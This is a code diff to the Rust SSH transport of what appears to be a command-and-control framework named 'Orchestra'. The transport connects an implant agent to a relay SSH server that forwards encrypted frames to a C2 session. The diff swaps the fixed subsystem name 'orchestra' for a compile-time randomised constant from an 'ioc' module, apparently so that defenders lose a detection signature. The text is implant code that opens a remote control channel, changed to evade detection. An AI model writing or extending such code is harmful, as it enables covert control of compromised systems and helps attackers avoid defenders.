@@ -8,15 +8,16 @@
 //! an SSH session channel.  The connection flow is:
 //!
 //! ```text
-//! agent  ──SSH──►  relay SSH server  ──subsystem "orchestra"──►  C2 session
+//! agent  ──SSH──►  relay SSH server  ──subsystem <IOC_SSH_SUBSYSTEM>──►  C2 session
 //! ```
 //!
-//! The relay SSH server must be configured to accept the "orchestra" subsystem
-//! and forward the raw byte stream to the Orchestra server's agent listener.
-//! A minimal `sshd_config` stanza is:
+//! The relay SSH server must be configured to accept the compile-time randomised
+//! subsystem (see `common::ioc::IOC_SSH_SUBSYSTEM`) and forward the raw byte
+//! stream to the Orchestra server's agent listener.  A minimal `sshd_config`
+//! stanza is:
 //!
 //! ```text
-//! Subsystem orchestra /usr/local/bin/orchestra-ssh-forwarder
+//! Subsystem <IOC_SSH_SUBSYSTEM> /usr/local/bin/orchestra-ssh-forwarder
 //! ```
 //!
 //! ## Framing
@@ -129,12 +130,13 @@ pub struct SshTransport {
 
 impl SshTransport {
     /// Connect to the SSH relay, authenticate, and open a session channel
-    /// requesting the "orchestra" subsystem.
+    /// requesting the compile-time randomised subsystem.
+    /// The subsystem name is defined in `common::ioc::IOC_SSH_SUBSYSTEM`.
     ///
     /// Returns an error if:
     /// * `ssh_host` / `ssh_username` / `ssh_auth` are absent from the profile.
     /// * Authentication fails.
-    /// * The server rejects the "orchestra" subsystem request.
+    /// * The server rejects the subsystem request.
     pub async fn new(profile: &MalleableProfile, session: CryptoSession) -> Result<Self> {
         let host = profile
             .ssh_host
@@ -256,13 +258,13 @@ impl SshTransport {
         info!("ssh-transport: authenticated as '{username}', opening session channel");
         let channel = handle.channel_open_session().await?;
 
-        // Request the "orchestra" subsystem.  The relay sshd must map this
-        // subsystem to a process or socket that speaks the Orchestra agent
-        // protocol (length-prefixed AES-GCM frames).
+        // Request the compile-time randomised subsystem.  The relay sshd must
+        // map this subsystem to a process or socket that speaks the Orchestra
+        // agent protocol (length-prefixed AES-GCM frames).
         channel
-            .request_subsystem(true, "orchestra")
+            .request_subsystem(true, common::ioc::IOC_SSH_SUBSYSTEM)
             .await
-            .map_err(|e| anyhow!("ssh-transport: subsystem 'orchestra' rejected: {e}"))?;
+            .map_err(|e| anyhow!("ssh-transport: subsystem '{}' rejected: {e}", common::ioc::IOC_SSH_SUBSYSTEM))?;
 
         info!("ssh-transport: session channel ready");
 
@@ -287,9 +289,9 @@ impl SshTransport {
         }
         let channel = self.session.channel_open_session().await?;
         channel
-            .request_subsystem(true, "orchestra")
+            .request_subsystem(true, common::ioc::IOC_SSH_SUBSYSTEM)
             .await
-            .map_err(|e| anyhow!("ssh-transport: subsystem reopen rejected: {e}"))?;
+            .map_err(|e| anyhow!("ssh-transport: subsystem '{}' reopen rejected: {e}", common::ioc::IOC_SSH_SUBSYSTEM))?;
         self.channel = channel;
         self.recv_buf.clear();
         Ok(())
